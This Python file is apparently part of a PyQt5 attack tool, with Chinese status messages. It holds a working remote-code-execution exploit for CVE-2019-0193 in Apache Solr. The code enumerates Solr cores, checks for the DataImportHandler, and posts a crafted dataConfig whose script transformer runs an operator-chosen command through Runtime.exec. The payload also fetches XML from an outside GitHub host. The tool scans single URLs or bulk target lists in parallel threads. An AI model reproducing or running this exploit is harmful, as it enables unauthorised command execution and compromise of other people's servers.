from PyQt5.Qt import QThread,pyqtSignal
import queue
import requests
import re
import threading

class ApacheCve(QThread):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0", "Content-type":"application/x-www-form-urlencoded"
    }
    str_signal = pyqtSignal([str,str])
    url_queue = queue.Queue()

    def __init__(self,url,urllist,cmd,cve:str,activity):
        super().__init__()
        self.url = url
        self.cmd = cmd
        self.cve = cve
        self.activity = activity
        self.urllist = urllist



    def CVE20190193(self):
        def verify(url):
            self.str_signal[str, str].emit('[+] 开始探测 ' + url, 'green')
            try:
                get_cores_url = url + "solr/admin/cores"
                Re = requests.get(get_cores_url, headers=self.headers)
                k = re.search(r'"name":"(.*)"', Re.text)[0]
                core = re.findall(r'"name":"(.*)"', k, re.S)[0]
                data_url = url + "solr/" + core + "/admin/mbeans?cat=QUERY&wt=json"
                Re0 = requests.get(data_url, headers=self.headers)
            except:
                self.str_signal[str, str].emit('[-] 发送请求失败', 'red')
                return
            if not "org.apache.solr.handler.dataimport.DataImportHandler" in Re0.text:
                self.str_signal[str, str].emit('[-] 未开启data import Handler功能，无法利用', 'red')
                return
            else:
                if self.activity == 'scan':
                    attack(url,core)
                else:
                    attack(url, core,cmd=self.cmd)

        def attack(url,core,cmd='whoami'):
            try:
                data_url = url + 'solr/' + core + "/dataimport?_=1566799867523&indent=on&wt=json"
                data = "command=full-import&verbose=false&clean=false&commit=true&debug=true&core=solr&dataConfig=%3CdataConfig%3E%0A%0A%0A++%3CdataSource+type%3D%22URLDataSource%22%2F%3E%0A++%3Cscript%3E%3C!%5BCDATA%5B%0A%0A++++++++++function+poc(row)%7B%0A%0A+var+bufReader+%3D+new+java.io.BufferedReader(new+java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(%22" + cmd + "%22).getInputStream()))%3B%0A%0Avar+result+%3D+%5B%5D%3B%0A%0Awhile(true)+%7B%0Avar+oneline+%3D+bufReader.readLine()%3B%0Aresult.push(+oneline+)%3B%0Aif(!oneline)+break%3B%0A%7D%0A%0Arow.put(%22title%22%2Cresult.join(%22%5Cn%5Cr%22))%3B%0A%0Areturn+row%3B%0A%0A%7D%0A%0A%0A++%5D%5D%3E%3C%2Fscript%3E%0A%0A++++++++%3Cdocument%3E%0A+++++++++++++%3Centity+name%3D%22entity1%22%0A+++++++++++++++++++++url%3D%22https%3A%2F%2Fraw.githubusercontent.com%2F1135%2Fsolr_exploit%2Fmaster%2FURLDataSource%2Fdemo.xml%22%0A+++++++++++++++++++++processor%3D%22XPathEntityProcessor%22%0A+++++++++++++++++++++forEach%3D%22%2FRDF%2Fitem%22%0A+++++++++++++++++++++transformer%3D%22script%3Apoc%22%3E%0A++++++++++++++++++++++++%3Cfield+column%3D%22title%22+xpath%3D%22%2FRDF%2Fitem%2Ftitle%22+%2F%3E%0A+++++++++++++%3C%2Fentity%3E%0A++++++++%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E&name=dataimport"
                Re1 = requests.post(data_url, data=data, headers=self.headers)
                kk = re.findall(r'"title":\["(.*)\\n', Re1.text, re.S)
                if self.activity == 'scan':
                    self.str_signal[str, str].emit('[+] 探测到用户为:' + kk[0] + '  存在 CVE-2019-0193 漏洞 url: ' + url, 'red')
                else:
                    self.str_signal[str, str].emit('[+] 命令执行成功', 'green')
                    self.str_signal[str, str].emit(str(kk[0]).replace('\\n\\r','<br>'),'green')
            except:
                self.str_signal[str, str].emit('[-] 命令执行失败', 'red')

        if self.urllist == '':
            url = self.url
            if "http://" not in url:
                url = "http://" + url
            if url[-1] != '/':
                url = url + '/'
            verify(url)
        else:
            while not self.url_queue.empty():
                url = self.url_queue.get()
                if "http://" not in url:
                    url = "http://" + url
                if url[-1] != '/':
                    url = url + '/'
                verify(url)
        self.str_signal[str, str].emit('[+] 线程执行完毕', 'green')

    def thread_fun(self):
        if self.activity == 'scan':
            self.CVE20190193()
        else:
            cve = self.cve.replace('-', '')
            if 'CVE20190193' == cve:
                self.CVE20190193()


    def run(self):
        if self.urllist == '':
            self.thread_fun()
        else:
            with open(self.urllist,'r',encoding='utf8') as f:
                for line in f.readlines():
                    self.url_queue.put(line.strip())
                    thread_list = []
                    for i in range(10):
                        thread_list.append(threading.Thread(target=self.thread_fun))
                    for t in thread_list:
                        t.start()
                    for t in thread_list:
                        t.join()



